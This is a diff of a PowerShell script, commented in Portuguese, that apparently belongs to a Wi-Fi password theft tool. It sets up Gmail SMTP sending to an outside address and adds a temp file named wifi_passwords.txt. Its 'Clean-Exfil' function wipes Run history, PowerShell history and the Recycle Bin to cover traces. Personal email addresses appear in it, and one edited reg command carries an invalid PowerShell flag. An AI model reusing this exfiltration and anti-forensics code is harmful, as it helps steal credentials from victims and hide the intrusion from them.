@@ -1,25 +1,33 @@
 ############################################################################################################
-Write-Output "Iniciando script de envio email"
+Write-Output "Iniciando script de envio de e-mail"
 
+# Parâmetros do e-mail
 $sendMailMessageSplat = @{
-    From = 'User01 <francisco.carmo12@gmail.com>'
-    To = 'User02 <nnboy2002@gmail.com>'
-    Subject = 'Test mail'
+    From       = 'User01 <francisco.carmo12@gmail.com>'
+    To         = 'User02 <nnboy2002@gmail.com>'
+    Subject    = 'Teste de Envio de E-mail'
+    Body       = 'Este é um teste de envio de e-mail do PowerShell.'
+    SmtpServer = 'smtp.gmail.com'  # Servidor SMTP do Gmail
+    Port       = 587
+    UseSsl     = $true
+    Credential = (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "francisco.carmo12@gmail.com", (ConvertTo-SecureString "SUA_SENHA_AQUI" -AsPlainText -Force))
 }
-Send-MailMessage @sendMailMessageSplat
 
-
-
-
+# Envia o e-mail
+try {
+    Send-MailMessage @sendMailMessageSplat
+    Write-Output "E-mail enviado com sucesso."
+} catch {
+    Write-Output "Falha no envio do e-mail: $_"
+}
 
 ############################################################################################################
 # Função para Limpar Arquivos Temporários e Histórico
 function Clean-Exfil { 
     Write-Output "Limpando arquivos temporários e histórico..."
 
-
     # Delete Run box history
-    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f -ErrorAction SilentlyContinue
 
     # Delete PowerShell history
     $historyPath = (Get-PSReadlineOption).HistorySavePath
@@ -30,6 +38,9 @@ function Clean-Exfil {
     # Empty Recycle Bin
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
+
+# Caminho para o arquivo temporário (defina o caminho apropriado)
+$outputFilePath = "$env:TEMP\wifi_passwords.txt"  # Caminho para o arquivo temporário de senhas
 
 # Executa a limpeza se o arquivo de senha foi enviado com sucesso
 if (Test-Path -Path $outputFilePath) {
@@ -44,4 +55,5 @@ Remove-Item -Path $outputFilePath -Force -ErrorAction SilentlyContinue
 
 Write-Output "Script concluído."
 ############################################################################################################
+
 
